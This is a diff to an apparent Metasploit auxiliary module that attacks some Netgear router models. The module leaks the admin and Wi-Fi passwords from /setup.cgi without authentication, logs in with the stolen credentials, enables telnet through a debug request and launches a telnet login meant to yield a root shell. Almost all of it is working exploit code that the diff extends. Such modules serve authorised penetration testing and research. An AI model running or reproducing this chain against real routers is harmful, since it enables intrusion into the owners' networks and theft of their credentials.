@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'metasploit/framework/credential_collection'
+
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
@@ -19,9 +21,9 @@ class MetasploitModule < Msf::Auxiliary
           unauthenticated attackers to reveal the password for the admin user that is used to log into the
           router's administrative portal, in plaintext.
 
-          Once the password has been been obtained, attackers can use the exploit/linux/telnet/netgear_telnetenable module
-          to send a special packet to port 23/udp of the router to enable a telnet server on port 23/tcp. The attacker can
-          then log into this telnet server using the new password, and obtain a shell as the "root" user.
+          Once the password has been been obtained, the exploit enables telnet on the target router and then utiltizes
+          the auxiliary/scanner/telnet/telnet_login module to log into the router using the stolen credentials of the
+          admin user. This will result in the attacker obtaining a new telnet session as the "root" user.
 
           This vulnerability was discovered and exploited by an independent security researcher who reported it to SSD.
         },
@@ -46,51 +48,85 @@ class MetasploitModule < Msf::Auxiliary
     )
     register_options(
       [
-        Opt::RPORT(8080)
+        Opt::RPORT(80)
       ]
     )
   end
 
-  def retrieve_firmware_version
+  def check
+    res = send_request_cgi(
+      'uri' => '/top.html',
+      'method' => 'GET'
+    )
+
+    if res.nil?
+      return Exploit::CheckCode::Unknown('Connection timed out.')
+    end
+
+    unless res.headers['WWW-Authenticate'] =~ /netgear/i
+      return Exploit::CheckCode::Safe('Target does not appear to be a Netgear router!')
+    end
+
+    # Retreive model name and firmware version
     res = send_request_cgi({ 'uri' => '/currentsetting.htm' })
     if res.nil?
       return Exploit::CheckCode::Unknown('Connection timed out.')
     end
 
     data = res.to_s
-    firmware_version = data.match(/Firmware=V(\d+\.\d+\.\d+\.\d+)(_(\d+\.\d+\.\d+))?/)
+    firmware_version = data.match(/^Firmware=V(\d+\.\d+\.\d+\.\d+)_(\d+\.\d+\.\d+)/)
     if firmware_version.nil?
       return Exploit::CheckCode::Unknown('Could not retrieve firmware version!')
     end
 
-    firmware_version
-  end
+    major_version = firmware_version[1]
+    minor_version = firmware_version[2]
 
-  def check
-    target_version = retrieve_version
-    print_status("Target is running firmware version #{target_version}")
-    if (target_version >= Rex::Version.new('1.2.0.0')) && (target_version < Rex::Version.new('1.2.0.88'))
+    model_name = data.match(/Model=([a-zA-Z0-9]+)/)
+    if model_name.nil?
+      return Exploit::CheckCode::Unknown('Could not retrieve model of the router!')
+    end
+
+    model_name = model_name[1]
+
+    # Check model is actually vulnerable
+    vulnerable_router_models = ['AC2100', 'AC2400', 'AC2600', 'D7000', 'R6220', 'R6230', 'R6260', 'R6330', 'R6350', 'R6700v2', 'R6800', 'R6850', 'R6900v2', 'R7200', 'R7350', 'R7400', 'R7450']
+    unless vulnerable_router_models.include?(model_name)
+      return Exploit::CheckCode::Safe('Not a vulnerable router model!')
+    end
+
+    # Check version is vulnerable
+    print_status("Target is a #{model_name} router running firmware version #{major_version}_#{minor_version}")
+    if (Rex::Version.new(major_version) >= Rex::Version.new('1.2.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.2.0.88'))
       return Exploit::CheckCode::Appears
-    elsif (target_version >= Rex::Version.new('1.0.1.0')) && (target_version < Rex::Version.new('1.0.1.80'))
+    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.0.1.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.0.1.80'))
       return Exploit::CheckCode::Appears
-    elsif (target_version >= Rex::Version.new('1.1.0.0')) && (target_version < Rex::Version.new('1.1.0.110')) # Need more work on this as this isn't a good check for affected versions and may overlap with patched versions.
+    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.1.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.1.0.110')) # Need more work on this as this isn't a good check for affected versions and may overlap with patched versions.
       return Exploit::CheckCode::Appears
-    elsif (target_version >= Rex::Version.new('1.1.0.0')) && (target_version < Rex::Version.new('1.1.0.84')) # Need more work on this to make sure we apply this to the correct systems.
+    elsif (Rex::Version.new(major_version) >= Rex::Version.new('1.1.0.0')) && (Rex::Version.new(major_version) < Rex::Version.new('1.1.0.84')) # Need more work on this to make sure we apply this to the correct systems.
       return Exploit::CheckCode::Appears
     else
-      return Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe('Not a vulnerable router version!')
     end
   end
 
   def run
+    print_status('Confirming target is a Netgear Router...')
     res = send_request_cgi(
       'uri' => '/',
       'method' => 'GET'
     )
-    unless res.headers['WWW-Authenticate'] =~ /Netgear/
+
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Connection timed out.')
+    end
+
+    unless res.headers['WWW-Authenticate'] =~ /netgear/i
       fail_with(Failure::NoTarget, 'Target does not appear to be a Netgear router!')
     end
 
+    print_good('Target is a Netgear router!')
+    print_status('Attempting to leak the password of the admin user...')
     res = send_request_cgi(
       'uri' => '/setup.cgi',
       'method' => 'GET',
@@ -100,36 +136,82 @@ class MetasploitModule < Msf::Auxiliary
       }
     )
 
-    unless %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">Admin user Name</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)
+    html_response = res.get_html_document
+    leaked_info_array = []
+    html_response.xpath('//div[@id="passpharse"]/following-sibling::div[@class="right_div"]').map { |node| leaked_info_array << node.text }
+    unless leaked_info_array.include?('admin')
       fail_with(Failure::UnexpectedReply, 'Application did not respond with the expected admin username in its response!')
     end
-    username = %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">Admin user Name</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)[0]
+    wifi_password = leaked_info_array[0]
+    wifi_password_5G = leaked_info_array[1]
+    username = leaked_info_array[2]
+    password = leaked_info_array[3]
 
-    unless %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">New Admin password</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)
-      fail_with(Failure::UnexpectedReply, 'Application did not respond with the expected admin password in its response!')
+    if html_response.xpath('//div[@id="network_name"]/following-sibling::div[@class="right_div"]').empty? || html_response.xpath('//div[@id="network_name"]/following-sibling::div[@class="right_div"]').length < 2
+      fail_with(Failure::UnexpectedReply, 'Application did not respond with an SSID in its response!')
+    else
+      wifi_ssid = html_response.xpath('//div[@id="network_name"]/following-sibling::div[@class="right_div"]')[1].text
     end
-    password = %r{<DIV class=left_div id=passpharse><span languageCode = "[0-9]+">New Admin password</span>: </DIV>\s*<DIV class=right_div>([^<]+)</DIV>}.match(res.text)[0]
+
+    if html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()').empty?
+      fail_with(Failure::UnexpectedReply, 'Application did not respond with an 5G SSID in its response!')
+    else
+      wifi_ssid_5G = html_response.xpath('//div[@id="network_name_5G"]/following-sibling::div/child::text()').text
+    end
 
     if username.empty? || password.empty?
       fail_with(Failure::UnexpectedReply, 'Application responded with expected content, but the matched content was an empty string for some reason!')
     end
 
     print_good("Can log into target router using username #{username} and password #{password}")
+
+    if wifi_ssid_5G.empty? || wifi_password_5G.empty?
+      print_warning("5G SSID information contained blank strings, information might be invalid!")
+    end
+
+    if wifi_ssid.empty? || wifi_password.empty?
+      print_warning("5G SSID information contained blank strings, information might be invalid!")
+    end
+
+
     print_status('Attempting to retrieve /top.html to verify we are logged in!')
 
+    print_status('Sending one request to grab authorization cookie from headers...')
+    res = send_request_cgi(
+      'uri' => '/top.html',
+      'method' => 'GET'
+    )
+
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')
+    end
+
+    unless res.headers['Set-Cookie']
+      fail_with(Failure::UnexpectedReply, "Router didn't respond with the expected Set-Cookie header to a response to /top.html!")
+    end
+    auth_cookie = res.headers['Set-Cookie']
+
+    print_status('Got the authentication cookie, associating it with a logged in session...')
     res = send_request_cgi(
       'uri' => '/top.html',
       'method' => 'GET',
-      'authorization' => basic_auth(username, password)
+      'authorization' => basic_auth(username, password),
+      'cookie' => auth_cookie
     )
 
-    unless %r{<div id="firm_version"><span languageCode = "[0-9]+">Firmware Version</span><br />([^\n]+)}.match(res.text)
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')
+    end
+
+    result = res.get_html_document
+    unless result.xpath("//div[@id='firm_version']/text()") # Find all div tags with an "id" attribute named "firm_version" and find its text value.
       fail_with(Failure::UnexpectedReply, 'The target router did not respond with a firmware version when /top.html was requested. Are we logged in?')
     end
 
     print_good('Successfully logged into target router using the stolen credentials!')
-    print_status('Storing credentials for future use...')
+    print_status('Attempting to store credentials for future use...')
 
+    # Create HTTP Login Data
     service_data = {
       address: datastore['RHOST'],
       port: datastore['RPORT'],
@@ -158,14 +240,33 @@ class MetasploitModule < Msf::Auxiliary
 
     create_credential_login(login_data)
 
-    print_status('Enabling telnet on the target router')
-    send_request_cgi(
+
+    print_status('Enabling telnet on the target router...')
+    res = send_request_cgi(
       'uri' => '/setup.cgi',
       'method' => 'GET',
       'vars_get' => {
         'todo' => 'debug'
       },
-      'authorization' => basic_auth(username, password)
+      'authorization' => basic_auth(username, password),
+      'cookie' => auth_cookie
     )
+
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Could not reach the target, something may have happened mid attempt!')
+    end
+
+    unless /Debug Enable!/.match(res&.body) # Since this is a one liner response, we don't use XPath searches here and instead resort to a plain regex match.
+      fail_with(Failure::UnexpectedReply, 'Target did not enable debug mode for some reason!')
+    end
+    print_good("Telnet enabled on target router!")
+    handler = framework.modules.create('auxiliary/scanner/telnet/telnet_login')
+    handler.datastore['RHOSTS'] = datastore['RHOST']
+    file_handle = File.open('netgear_pnpx_wordlist.txt', 'w')
+    file_handle.write("#{username} #{password}")
+    file_handle.close()
+    handler.datastore['USERPASS_FILE'] = 'netgear_pnpx_wordlist.txt'
+    print_status("Attempting to log in with #{username}:#{password}. You should get a new telnet session as the root user")
+    handler.run
   end
 end
